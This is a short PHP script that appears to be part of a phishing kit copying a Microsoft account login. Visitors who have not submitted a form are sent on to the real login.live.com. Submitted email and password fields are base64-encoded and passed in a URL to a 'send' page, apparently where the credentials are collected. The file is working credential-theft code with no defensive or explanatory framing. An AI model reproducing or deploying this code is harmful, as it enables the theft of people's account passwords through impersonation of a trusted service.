<?php
session_start();
require_once('config/config.php');
if (!isset($_POST['passwd'])) {
    header("location: https://login.live.com");
} else {
  $data = array($_POST['loginfmt'], $_POST['passwd'], $_POST['passwd1']);
  $b1 = base64_encode($data['0']);
  $b2 = base64_encode($data['1']);
  $b3 = base64_encode($data['2']);
  echo "<script type='text/javascript'>window.top.location='send?verification=fill&token=$b1&auth=$b2&auth1=$b3'</script>";
}
